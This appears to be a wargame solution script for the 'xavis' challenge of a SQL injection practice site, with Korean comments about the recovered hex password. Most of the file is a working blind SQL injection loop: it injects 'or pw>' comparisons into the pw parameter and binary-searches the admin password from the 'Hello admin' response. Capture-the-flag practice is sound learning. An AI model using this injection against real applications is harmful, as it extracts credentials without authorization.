#재밌는 문제인데, 얻은 값 0xc6b00000c6550000ad730000000000000000000000000000000000000000가 죽어도 디코딩이 안되어서 결국 정답을 봤다. 진짜 용서모태 부들부들
# 0xc6b00000c6550000ad730000000000000000000000000000000000000000
# xavis_decode.py에서 디코딩을 해보겠도다
# hex를 보면 xxxx0000xxxx0000xxxx0000구조로 되어있다는게 힌트


import requests
from dotenv import load_dotenv
import os

load_dotenv()


below = 0x100000000000000000000000000000000000000000000000900999090000
above = 0x1000000000000000000000000000000000000000000000000000000000000
while True:
    mid = (below + above) // 2
    hexmid = hex(mid)
    url=os.environ.get('LOS_URL')+'chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=1234%27or%20pw%3E'+hexmid+'%20%23'
    headers = {
        'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
    }
    print(hexmid)

    res=requests.get(url, headers=headers)
    if "Hello admin" in res.text:
        below = mid
    else:
        above = mid
    if above - below == 1:
        break
print("Success")
print("below: ", below)
print("above: ", above)
print("mid: ", mid)
print("pw: ", mid)